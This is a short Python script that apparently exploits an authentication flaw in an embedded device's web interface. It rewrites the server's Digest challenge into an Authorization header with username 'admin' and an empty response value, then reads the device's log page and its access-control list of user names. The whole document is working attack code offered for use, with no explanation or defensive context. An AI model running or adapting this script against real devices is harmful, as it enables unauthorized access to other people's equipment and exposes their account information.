import requests
from bs4 import BeautifulSoup

def check(status):
    if status != 200:
        print(f"fail ({status})")
        exit(1)

def auth():
    r = requests.get(f"{url}/index.htm", headers={ "User-Agent": "Mozilla/5.0" }, timeout=15)
    authorization = r.headers["WWW-Authenticate"].replace('stale="false"', 'username="admin",response="",uri="/index.htm",nc="0000000d",cnonce="5d69d392783e4721"')
    return {
        "User-Agent": "Mozilla/5.0",
        "Authorization": authorization
    }

ip = input("Ip: ")
port = input("Port: ")
url = f"http://{ip}:{port}"

r = requests.get(f"{url}/index.htm", headers=auth(), timeout=15)
check(r.status_code)

html = BeautifulSoup(r.text, "html.parser")
text = [x for x in html.find(class_="log").get_text().splitlines() if x.strip()]
for (x, y) in zip(text[0::2], text[1::2]):
    print(f"{x}: {y}")

r = requests.get(f"{url}/acl.htm", headers=auth(), timeout=15)
check(r.status_code)

html = BeautifulSoup(r.text, "html.parser")
users = [x.text for x in html.find(class_="r1").find_all("option")]
print(f"Users: {users}")